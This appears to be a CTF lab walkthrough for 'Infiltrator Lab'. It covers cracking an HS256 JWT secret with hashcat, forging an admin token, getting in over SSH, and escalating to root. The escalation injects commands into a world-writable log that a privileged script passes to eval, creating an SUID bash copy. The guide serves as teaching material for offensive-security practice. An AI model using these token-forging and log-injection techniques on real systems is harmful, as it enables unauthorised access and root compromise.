# 🥷 Infiltrator Lab --- CTF Guide

> **Purpose:** Educational CTF/lab practice. Use these techniques only
> on systems you are authorized to test.

------------------------------------------------------------------------

## 1. Lab Attack Chain

``` text
Register / Login
      ↓
Find JWT cookie
      ↓
Decode JWT
      ↓
Identify HS256
      ↓
Recover JWT secret
      ↓
Forge admin JWT
      ↓
Access /admin
      ↓
Obtain SSH credentials
      ↓
SSH as ctf
      ↓
Privilege-escalation enumeration
      ↓
Find log_watcher.sh
      ↓
Find eval "$line"
      ↓
Find writable custom.log
      ↓
Command injection
      ↓
SUID Bash
      ↓
Root shell
      ↓
Root flag
```

------------------------------------------------------------------------

# 2. Folder Structure

Keep the Python helper scripts separately in the same
project/repository.

Recommended structure:

``` text
infiltrator/
├── guide.md
├── Decode.py
├── TestJWT.py
├── Forge.py
├── jwt.txt
└── admin_jwt.txt
```

The Python files are documented separately. This guide focuses only on
the **workflow, commands, concepts, and what to look for**.

------------------------------------------------------------------------

# 3. Step 1 --- Login and Get the JWT

Register/login to the lab website.

After login, inspect the browser cookies.

Look for:

``` text
jwt=YOUR_TOKEN
```

Copy the JWT and save it locally as `jwt.txt`.

Then use the separate `Decode.py` helper.

Run:

``` bash
python Decode.py
```

------------------------------------------------------------------------

# 4. Step 2 --- Analyze the JWT

The JWT has three parts:

``` text
HEADER.PAYLOAD.SIGNATURE
```

Look for:

``` text
alg = HS256
username = ...
role = user
exp = ...
```

### Important concept

``` text
HS256 → shared secret
```

The objective is to recover the signing secret.

------------------------------------------------------------------------

# 5. Step 3 --- Recover the JWT Secret

Use Hashcat JWT mode:

``` bash
hashcat -m 16500 jwt.txt WORDLIST
```

For this lab, the documented recovered secret is:

``` text
!!!secret!!!
```

If practicing another instance, use the secret/wordlist appropriate to
that instance.

------------------------------------------------------------------------

# 6. Step 4 --- Test the Secret

Use the separate helper:

``` bash
python TestJWT.py
```

Expected result:

``` text
[+] SECRET IS VALID
```

The purpose of this step is to confirm that the recovered secret
correctly validates the JWT signature.

------------------------------------------------------------------------

# 7. Step 5 --- Forge an Admin JWT

Use the separate helper:

``` bash
python Forge.py
```

The helper creates:

``` text
admin_jwt.txt
```

The forged payload should conceptually contain:

``` text
username = admin
role = admin
exp = future timestamp
```

The important idea is that the modified JWT must be **signed using the
recovered HS256 secret**.

------------------------------------------------------------------------

# 8. Step 6 --- Verify the Forged Token

Use the decoder helper with the generated token:

``` bash
python3 Decode.py "$(cat admin_jwt.txt)"
```

Check that the payload contains:

``` text
username = admin
role = admin
```

------------------------------------------------------------------------

# 9. Step 7 --- Access the Admin Panel

Replace the browser's `jwt` cookie with the forged token.

Open:

``` text
/admin
```

The admin panel should provide the SSH information for the lab:

``` text
Host
Port
Username
Password
```

------------------------------------------------------------------------

# 10. Step 8 --- SSH

Use the credentials provided by the admin panel:

``` bash
ssh ctf@TARGET_IP
```

Then verify:

``` bash
whoami
```

Expected:

``` text
ctf
```

Find the user flag:

``` bash
find / -name "flag-user.txt" 2>/dev/null
```

Then read the path returned by `find`.

------------------------------------------------------------------------

# 11. Step 9 --- Privilege Escalation Enumeration

Check SUID binaries:

``` bash
find / -perm -4000 -type f 2>/dev/null
```

Inspect the suspicious watcher:

``` bash
ls -l /usr/local/bin/log_watcher.sh
```

Read it:

``` bash
cat /usr/local/bin/log_watcher.sh
```

Look for:

``` text
eval "$line"
```

------------------------------------------------------------------------

# 12. Understand the Vulnerability

The vulnerable flow is:

``` text
custom.log
    ↓
log_watcher.sh reads a line
    ↓
eval "$line"
    ↓
line becomes a shell command
```

If the watcher has elevated privileges, commands supplied through the
log can execute with those privileges.

------------------------------------------------------------------------

# 13. Check Log Permissions

Run:

``` bash
ls -l /var/log/custom.log
```

The vulnerable lab configuration has a world-writable log:

``` text
-rw-rw-rw-
```

The important combination is:

``` text
Privileged watcher
       +
eval "$line"
       +
Writable log
```

This creates the command-injection privilege-escalation path.

------------------------------------------------------------------------

# 14. Step 10 --- Exploit the Log Injection

In the authorized CTF environment, append the documented commands to the
log:

``` bash
echo 'cp /bin/bash /tmp/rootbash' >> /var/log/custom.log
```

``` bash
echo 'chmod +s /tmp/rootbash' >> /var/log/custom.log
```

Wait for the watcher to process the log.

Check:

``` bash
ls -l /tmp/rootbash
```

Look for the SUID bit:

``` text
-rwsr-xr-x
```

------------------------------------------------------------------------

# 15. Step 11 --- Get the Root Shell

Run:

``` bash
/tmp/rootbash -p
```

Verify:

``` bash
id
```

Successful privilege escalation should show:

``` text
euid=0(root)
```

### UID vs EUID

``` text
uid  = original login user
euid = effective privileges of the process
```

Therefore:

``` text
uid=1000(ctf) euid=0(root)
```

means the process was started by `ctf` but is executing with root
privileges.

------------------------------------------------------------------------

# 16. Step 12 --- Read the Root Flag

Once root access is confirmed:

``` bash
cat /root/flag-root.txt
```

------------------------------------------------------------------------

# 17. Quick Revision

## Web phase

``` text
Login
 ↓
JWT cookie
 ↓
Decode.py
 ↓
HS256
 ↓
Recover secret
 ↓
TestJWT.py
 ↓
Forge.py
 ↓
Admin JWT
 ↓
/admin
```

## Linux phase

``` text
SSH
 ↓
User flag
 ↓
SUID enumeration
 ↓
log_watcher.sh
 ↓
eval "$line"
 ↓
Writable custom.log
 ↓
Command injection
 ↓
SUID Bash
 ↓
/tmp/rootbash -p
 ↓
euid=0
 ↓
Root flag
```

------------------------------------------------------------------------

# 18. Helper Scripts

The repository should contain these separately:

``` text
Decode.py
TestJWT.py
Forge.py
```

Use them as:

``` bash
python Decode.py
```

``` bash
python TestJWT.py
```

``` bash
python Forge.py
```

The Python source code is intentionally kept out of this Markdown guide
so the repository remains clean and the scripts can be read/used
separately.

------------------------------------------------------------------------

# 19. Final Attack Chain

``` text
JWT
 ↓
HS256
 ↓
Secret
 ↓
Admin JWT
 ↓
Admin panel
 ↓
SSH
 ↓
log_watcher
 ↓
eval
 ↓
Writable log
 ↓
SUID Bash
 ↓
Root
 ↓
Flag
```

## Key things to remember

``` text
HS256
    → JWT signing secret

role=user
    → privilege escalation target

/admin
    → admin functionality

eval "$line"
    → command execution

Writable log + privileged watcher
    → privilege escalation

SUID Bash
    → elevated shell
```
